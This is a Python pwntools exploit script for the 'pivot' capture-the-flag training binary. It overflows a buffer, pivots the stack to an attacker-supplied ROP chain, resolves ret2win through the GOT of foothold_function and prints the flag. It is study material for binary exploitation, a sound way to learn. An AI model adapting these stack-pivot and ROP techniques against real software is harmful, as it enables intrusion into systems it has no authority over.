#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pivot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pivot')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def parse_pivot_addr(lines):
    addr = 0x0
    for line in lines:
        if 'kindly' in line:
            parts = line.split(" ")
            addr = int(parts[-1], 16)
            break
    return addr

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x400aa9
b *0x400ada
b *0x400adf
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RPATH:    b'./'

# context.log_level = 'debug'

# io = start()
# initial_lines = io.recvuntil(">").decode().split('\n')
# io.send(cyclic(255))
# io.recvuntil(">")
# io.send(cyclic(64))
# io.wait()
# core = io.corefile
# stack = core.rsp
# info("stack: %#x", stack)
# pattern = core.read(stack, 4)
# offset = cyclic_find(pattern)
# info("pattern: %r", pattern)
# info("offset:  %r", offset)

# get the address
# pivot_addr = parse_pivot_addr(initial_lines)
# info("pivot addr: %#x", pivot_addr)

offset = 40

# Overview
# based on the notes in the instructions, it looks like we need to do something
# like the following:
#
# * "Smash" payload should pivot us over to our new "home"
# - need to call foothold_function() to cause .got.plt entry to be populated
# - then, look at the .got.plt entry to locate the resolved address
# - from there, we can calculate the address of ret2win()
# - call ret2win

# CONSTANTS
foothold_plt = 0x400850
foothold_got = 0x602048
ret2win_offset = 0x14e
# 0x400b00: pop rax; ret;
pop_rax = 0x400b00
# 0x400b02: xchg rax, rsp; ret;
xchg_rax_rsp = 0x400b02
# 0x400b05: mov rax, qword ptr [rax]; ret;
mov_rax_ptr_rax = 0x400b05
# 0x400900: pop rbp; ret;
pop_rbp = 0x400900
# 0x400b09: add rax, rbp; ret;
add_rax_rbp = 0x400b09
# 0x40098e: call rax;
call_rax = 0x40098e

# build the secondary payload (this is our new/fake stack)
fake_stack = fit({
    0: [
        p64(foothold_plt),
        p64(pop_rax),
        p64(foothold_got),
        p64(mov_rax_ptr_rax),
        p64(pop_rbp),
        p64(ret2win_offset),
        p64(add_rax_rbp),
        p64(call_rax),
    ]}, length=254)

# save to disk for use with gdb
with open('fakestack.dat', 'wb') as out_file:
    out_file.write(fake_stack)

# now, we run the attack
io = start()
initial_lines = io.recvuntil("Send your second chain now and it will land there").decode().split('\n')
pivot_addr = parse_pivot_addr(initial_lines)
info("pivot addr: %#x", pivot_addr)

pid = util.proc.pidof(io)[0]
info("PID = %s", str(pid))

# uncomment to use the debugger
# util.proc.wait_for_debugger(pid)

# send the fake stack
io.sendline(fake_stack)

# build stack-pivot payload
payload = fit({
    offset: [
        p64(pop_rax),
        p64(pivot_addr),
        p64(xchg_rax_rsp)
    ]}, length=64)

# save to disk for use with gdb
with open('payload.dat', 'wb') as out_file:
    out_file.write(payload)

io.recvuntil("Now kindly send your stack smash")
# send our overflow/pivot
io.sendline(payload)
io.recv()
io.wait_for_close()

lines = io.recv().decode().split('\n')
flag = None
for line in lines:
    if 'flag' in line:
        # parse oddly, due to the way it is getting returned
        parts = line.split('pivot.so')
        flag = parts[1]
        break
success(flag)
